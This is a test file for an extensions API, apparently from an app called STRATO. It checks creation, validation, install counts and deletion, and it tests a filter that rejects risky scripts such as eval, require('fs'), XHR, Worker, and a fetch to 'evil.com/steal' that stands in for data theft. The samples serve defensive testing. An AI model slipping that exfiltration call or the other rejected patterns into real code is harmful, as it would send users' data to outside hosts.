// ── STRATO v21 — Extensions Routes Tests ──
// Tests for src/routes/extensions.js: CRUD, script validation, dangerous patterns

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { default as express } from 'express';
import request from 'supertest';
import { createMockStore, sampleExtension, buildApp } from '../setup.js';

const mockStore = createMockStore();
vi.mock('../../src/db/store.js', () => ({
  default: mockStore,
}));

describe('Extensions Routes', () => {
  let app;

  beforeEach(async () => {
    vi.clearAllMocks();
    Object.keys(mockStore._collections).forEach((k) => delete mockStore._collections[k]);

    const { default: router } = await import('../../src/routes/extensions.js');
    app = await buildApp(router, mockStore);
  });

  describe('GET /api/extensions', () => {
    it('should return paginated extensions list', async () => {
      mockStore._seed('extensions', [
        { ...sampleExtension, id: 'e1' },
        { ...sampleExtension, id: 'e2', code: 'ad-blocker', name: 'Ad Blocker' },
      ]);

      const res = await request(app).get('/api/extensions');
      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('total');
      expect(res.body).toHaveProperty('extensions');
      expect(res.body).toHaveProperty('page');
      expect(res.body).toHaveProperty('limit');
    });

    it('should not include script in list view', async () => {
      mockStore._seed('extensions', [{ ...sampleExtension, id: 'e1' }]);

      const res = await request(app).get('/api/extensions');
      expect(res.body.extensions[0]).not.toHaveProperty('script');
    });

    it('should return empty list when no extensions exist', async () => {
      const res = await request(app).get('/api/extensions');
      expect(res.status).toBe(200);
      expect(res.body.extensions).toEqual([]);
    });
  });

  describe('GET /api/extensions/:code', () => {
    it('should return extension details with script', async () => {
      mockStore._seed('extensions', [{ ...sampleExtension, code: 'dark-reader' }]);

      const res = await request(app).get('/api/extensions/dark-reader');
      expect(res.status).toBe(200);
      expect(res.body.code).toBe('dark-reader');
      expect(res.body).toHaveProperty('script');
    });

    it('should return 404 for nonexistent extension', async () => {
      const res = await request(app).get('/api/extensions/nonexistent');
      expect(res.status).toBe(404);
    });
  });

  describe('POST /api/extensions', () => {
    it('should create a new extension with safe script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({
          name: 'My Extension',
          code: 'my-extension',
          description: 'A safe extension',
          script: 'document.title = "Hello";',
          version: '1.0.0',
        });

      expect(res.status).toBe(201);
      expect(res.body.name).toBe('My Extension');
      expect(res.body.code).toBe('my-extension');
      expect(res.body.created_by).toBe('testuser');
      expect(res.body.downloads).toBe(0);
    });

    it('should return 400 for missing name', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ code: 'test', description: 'desc', script: 'console.log(1);' });

      expect(res.status).toBe(400);
    });

    it('should return 400 for name over 50 characters', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'x'.repeat(51), code: 'test', description: 'desc', script: 'console.log(1);' });

      expect(res.status).toBe(400);
    });

    it('should return 400 for invalid code format', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Test', code: 'INVALID CODE!', description: 'desc', script: 'console.log(1);' });

      expect(res.status).toBe(400);
    });

    it('should return 400 for missing description', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Test', code: 'test', script: 'console.log(1);' });

      expect(res.status).toBe(400);
    });

    it('should return 400 for description over 500 characters', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Test', code: 'test', description: 'x'.repeat(501), script: 'console.log(1);' });

      expect(res.status).toBe(400);
    });

    it('should return 400 for missing script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Test', code: 'test', description: 'desc' });

      expect(res.status).toBe(400);
    });

    it('should return 400 for invalid version format', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Test', code: 'test', description: 'desc', script: 'console.log(1);', version: 'v1.0' });

      expect(res.status).toBe(400);
    });

    it('should return 409 for duplicate extension code', async () => {
      mockStore._seed('extensions', [{ ...sampleExtension, code: 'dark-reader' }]);

      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Copy', code: 'dark-reader', description: 'Copy', script: 'console.log(1);' });

      expect(res.status).toBe(409);
    });

    it('should default version to 1.0.0 if not provided', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'No Version', code: 'no-version', description: 'desc', script: 'console.log(1);' });

      expect(res.status).toBe(201);
      expect(res.body.version).toBe('1.0.0');
    });
  });

  describe('Script validation (dangerous patterns)', () => {
    it('should reject eval() in script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-eval', description: 'Uses eval', script: 'eval("alert(1)")' });

      expect(res.status).toBe(400);
      expect(res.body.error).toContain('disallowed pattern');
    });

    it('should reject Function() constructor in script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-fn', description: 'Uses Function', script: 'new Function("alert(1)")()' });

      expect(res.status).toBe(400);
    });

    it('should reject import statements in script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-import', description: 'Uses import', script: 'import fs from "fs"' });

      expect(res.status).toBe(400);
    });

    it('should reject require() in script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-require', description: 'Uses require', script: 'require("fs")' });

      expect(res.status).toBe(400);
    });

    it('should reject fetch to absolute URL', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-fetch', description: 'Fetches external', script: 'fetch("https://evil.com/steal")' });

      expect(res.status).toBe(400);
    });

    it('should reject XMLHttpRequest in script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-xhr', description: 'Uses XHR', script: 'new XMLHttpRequest()' });

      expect(res.status).toBe(400);
    });

    it('should reject Worker in script', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Evil', code: 'evil-worker', description: 'Creates worker', script: 'new Worker("blob:...")' });

      expect(res.status).toBe(400);
    });

    it('should reject script over 100KB', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Big', code: 'big-script', description: 'Huge script', script: 'x'.repeat(100_001) });

      expect(res.status).toBe(400);
      expect(res.body.error).toContain('100KB');
    });

    it('should allow fetch with relative URLs', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({ name: 'Safe', code: 'safe-fetch', description: 'Fetches relative', script: 'fetch("/api/data").then(r=>r.json())' });

      expect(res.status).toBe(201);
    });

    it('should allow safe DOM manipulation scripts', async () => {
      const res = await request(app)
        .post('/api/extensions')
        .send({
          name: 'Dark Mode',
          code: 'dark-mode-safe',
          description: 'Simple dark mode',
          script: 'document.body.style.backgroundColor = "#1a1a2e"; document.body.style.color = "#e2e8f0";',
        });

      expect(res.status).toBe(201);
    });
  });

  describe('POST /api/extensions/:code/install', () => {
    it('should increment download count', async () => {
      mockStore._seed('extensions', [{ ...sampleExtension, code: 'dark-reader', downloads: 50 }]);

      const res = await request(app).post('/api/extensions/dark-reader/install');
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.downloads).toBe(51);
    });

    it('should return 404 for nonexistent extension', async () => {
      const res = await request(app).post('/api/extensions/nonexistent/install');
      expect(res.status).toBe(404);
    });
  });

  describe('DELETE /api/extensions/:code', () => {
    it('should delete extension created by the same user', async () => {
      mockStore._seed('extensions', [{ ...sampleExtension, code: 'dark-reader', created_by: 'testuser' }]);

      const res = await request(app).delete('/api/extensions/dark-reader');
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });

    it('should return 403 when deleting another users extension', async () => {
      mockStore._seed('extensions', [{ ...sampleExtension, code: 'dark-reader', created_by: 'otheruser' }]);

      const res = await request(app).delete('/api/extensions/dark-reader');
      expect(res.status).toBe(403);
    });

    it('should return 404 for nonexistent extension', async () => {
      const res = await request(app).delete('/api/extensions/nonexistent');
      expect(res.status).toBe(404);
    });
  });
});
